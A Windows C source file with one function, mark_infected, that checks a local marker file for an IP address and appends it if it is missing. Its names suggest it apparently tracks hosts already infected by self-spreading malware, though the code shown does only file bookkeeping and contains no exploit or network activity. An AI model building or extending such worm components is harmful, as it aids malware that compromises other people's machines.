#include "config.h"
#include <windows.h>
#include <string.h>

int mark_infected(const char *ip)
{
    HANDLE file;
    size_t ip_length;
    char buffer[4096];
    DWORD bytes_read;
    size_t matched;
    int match_possible;
    int pending_cr;
    int line_has_data;
    int already_present = 0;
    LARGE_INTEGER position;

    if (ip == NULL)
        return -1;

    ip_length = strlen(ip);

    file = CreateFileA(SELF_MARKER,
                       GENERIC_READ | GENERIC_WRITE,
                       0,
                       NULL,
                       OPEN_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    position.QuadPart = 0;
    if (!SetFilePointerEx(file, position, NULL, FILE_BEGIN)) {
        CloseHandle(file);
        return -1;
    }

    matched = 0;
    match_possible = 1;
    pending_cr = 0;
    line_has_data = 0;

    for (;;) {
        DWORD i;

        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL)) {
            CloseHandle(file);
            return -1;
        }

        if (bytes_read == 0)
            break;

        for (i = 0; i < bytes_read; ++i) {
            unsigned char byte = (unsigned char)buffer[i];

            if (byte == '\n') {
                if (match_possible && matched == ip_length) {
                    already_present = 1;
                    break;
                }
                matched = 0;
                match_possible = 1;
                pending_cr = 0;
                line_has_data = 0;
                continue;
            }

            line_has_data = 1;

            if (pending_cr) {
                if (match_possible) {
                    if (matched < ip_length &&
                        (unsigned char)ip[matched] == '\r') {
                        ++matched;
                    } else {
                        match_possible = 0;
                    }
                }
                pending_cr = 0;
            }

            if (byte == '\r') {
                pending_cr = 1;
            } else if (match_possible) {
                if (matched < ip_length &&
                    (unsigned char)ip[matched] == byte) {
                    ++matched;
                } else {
                    match_possible = 0;
                }
            }
        }

        if (already_present)
            break;
    }

    if (!already_present && line_has_data) {
        if (pending_cr && match_possible) {
            if (matched < ip_length &&
                (unsigned char)ip[matched] == '\r') {
                ++matched;
            } else {
                match_possible = 0;
            }
        }

        if (match_possible && matched == ip_length)
            already_present = 1;
    }

    if (already_present) {
        CloseHandle(file);
        return 1;
    }

    position.QuadPart = 0;
    if (!SetFilePointerEx(file, position, NULL, FILE_END)) {
        CloseHandle(file);
        return -1;
    }

    {
        size_t offset = 0;

        while (offset < ip_length) {
            size_t remaining = ip_length - offset;
            DWORD amount = remaining > (size_t)0xFFFFFFFFUL
                               ? (DWORD)0xFFFFFFFFUL
                               : (DWORD)remaining;
            DWORD bytes_written;

            if (!WriteFile(file, ip + offset, amount, &bytes_written, NULL) ||
                bytes_written == 0) {
                CloseHandle(file);
                return -1;
            }
            offset += bytes_written;
        }
    }

    {
        const char newline = '\n';
        DWORD bytes_written;

        if (!WriteFile(file, &newline, 1, &bytes_written, NULL) ||
            bytes_written != 1) {
            CloseHandle(file);
            return -1;
        }
    }

    CloseHandle(file);
    return 0;
}